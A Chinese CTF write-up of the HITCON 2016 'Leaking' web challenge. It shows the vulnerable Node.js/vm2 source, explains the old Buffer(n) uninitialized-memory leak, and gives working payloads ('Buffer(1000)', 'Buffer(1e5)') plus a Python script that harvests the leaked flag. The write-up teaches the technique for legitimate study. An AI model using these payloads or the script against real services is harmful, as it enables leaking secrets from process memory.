---
title: HITCON 2016 - Web - Leaking
date: 2026-11-14 18:17:00
categories:
  - CTF
  - HITCON 2016
  - Web
tags:
  - Node.js
  - vm2沙箱
  - Buffer内存泄漏
  - Heartbleed
cover: /img/cover/green-hair-letter-girl.jpg
description: HITCON 2016 的 Node.js vm2 沙箱内存泄漏题。eval 把 flag 放进随机变量名，data 限 12 字符。借旧版 Node Buffer(n) 不清零内存，发 Buffer(1000) 读残留搜出 flag。
keywords:
  - vm2
  - Buffer
  - 内存泄漏
  - Heartbleed
  - HITCON2016
ai: >-
  本题来自 HITCON 2016，考点是 Node.js vm2 沙箱与旧版 Buffer 内存泄漏，类似 Heartbleed。访问 / 返回源码：eval 把 flag 写进 64 位随机变量名的全局变量，data 限 12 字符送进 vm2 沙箱执行，变量名随机且沙箱隔离 process、require，常规逃逸不可行。突破口是旧版 Node 的 Buffer(n) 分配内存不清零，flag 此前已被 eval 分配进内存，发 Buffer(1000) 恰好满足长度限制即可读到残留。多次请求按 hitcon、CTF 等特征搜出 flag，脱敏记为 flag{xxxx}。
copyright_author: Hunter
---

## 题目信息

| 项 | 内容 |
|---|---|
| 比赛 | HITCON 2016 |
| 方向 | Web |
| 难度 | Easy |
| 环境 | 授权靶场（已脱敏） |
| 漏洞类型 | Node.js vm2 沙箱 + Buffer 内存泄漏（类 Heartbleed） |

## 信息收集

访问 `/` 直接返回源码：

```javascript
"use strict";
var randomstring = require("randomstring");
var express = require("express");
var { VM } = require("vm2");
var fs = require("fs");

var app = express();
var flag = require("./config.js").flag

app.get("/", function(req, res) {
    res.header("Content-Type", "text/plain");
    /* Orange is so kind so he put the flag here. */
    eval("var flag_" + randomstring.generate(64) + " = \"hitcon{" + flag + "}\";")
    if (req.query.data && req.query.data.length <= 12) {
        var vm = new VM({ timeout: 1000 });
        console.log(req.query.data);
        res.send("eval ->" + vm.run(req.query.data));
    } else {
        res.send(fs.readFileSync(__filename).toString());
    }
});
```

## 漏洞分析

### 关键点

1. flag 通过 `eval("var flag_<64位随机串> = \"hitcon{flag}\";")` 赋值到随机变量名的全局变量。
2. 用户输入 `req.query.data`（长度 ≤ 12）在 **vm2 沙箱**中执行。
3. vm2 沙箱隔离了 `process`、`require` 等，无法直接逃逸；变量名随机也无法猜取。

### 核心思路：Buffer 内存泄漏

旧版 Node.js 的 `Buffer` 构造函数（`Buffer(n)`）分配内存时**不清除之前的内容**（类似 OpenSSL Heartbleed 漏洞）。flag 字符串 `hitcon{...}` 在 `eval` 时被分配到内存中，随后 `vm.run` 执行时用 `Buffer(大数字)` 分配一块大内存，即可「读到」之前 flag 字符串所在的内存。

### payload

```text
Buffer(1000)
```

- `Buffer(1000)` = 12 字符，恰好满足 `length <= 12` 限制。
- 用科学计数法可分配更大内存：`Buffer(1e5)`（11 字符）= 100000 字节。

多次请求后在返回的未初始化内存中可搜到残留：

```text
flag_oZpOrsEasExUJnLhozst6WW6HraMU1eEu68g8lXrWwqKhL0icdwMCdtmUMWl0VT9
hitcon{flag{xxxx}}
```

## 利用过程

1. 访问 `/` 拿到源码，确认 flag 被放入随机变量名、输入受 12 字符限制并跑在 vm2 沙箱。
2. 用 `Buffer(1000)` 作为 `data` 参数，触发未初始化内存回显。
3. 反复请求，在响应中按 `hitcon` / `CTF` / `flag` / uuid 大括号等特征搜索可打印字符串。
4. 命中 `hitcon{...}` 形式的内容，提取 flag。

## 完整 EXP

提取脚本：

```python
import urllib.request, urllib.parse, re

HOST = 'http://target:8080/'  # 授权靶场（已脱敏）
def req_raw(path):
    rq = urllib.request.Request(HOST+path, headers={'User-Agent':'Mozilla/5.0'})
    return urllib.request.urlopen(rq, timeout=30).read()

for i in range(8):
    data = req_raw('/?data=' + urllib.parse.quote('Buffer(1000)'))
    idx = data.find(b'eval ->')
    body = data[idx+7:] if idx >= 0 else data
    text = body.decode('latin-1')
    for m in re.finditer(r'[ -~]{15,}', text):
        s = m.group()
        if re.search(r'hitcon|CTF|flag|\{[0-9a-f]{8}-', s, re.I):
            print(s)
```

payload 清单（长度 ≤ 12）：

```text
Buffer(1000)     # 12 字符
Buffer(1e5)      # 11 字符，分配 100000 字节，命中率更高

# 请求形态：/?data=Buffer(1000)
# 多次请求，在返回的未初始化内存中搜索 "hitcon" / "CTF" / "flag" 关键字
```

## Flag

`flag{xxxx}`（已脱敏，内存中为 `hitcon{flag{xxxx}}` 形式）

## 踩坑与总结

1. 源码泄漏（`/` 返回 `__filename`），是分析入口。
2. flag 被 `eval` 放入 64 位随机变量名的全局变量，无法猜变量名获取。
3. **旧版 Node Buffer 不清内存**：`Buffer(n)` 分配的内存包含之前 flag 字符串的内容。
4. `Buffer(1000)`（12 字符）恰好满足长度限制；`Buffer(1e5)` 用科学计数法分配更大内存。
5. 泄漏内容带随机性，需多次请求并用 latin-1 解码 + 可打印字符串正则筛选。
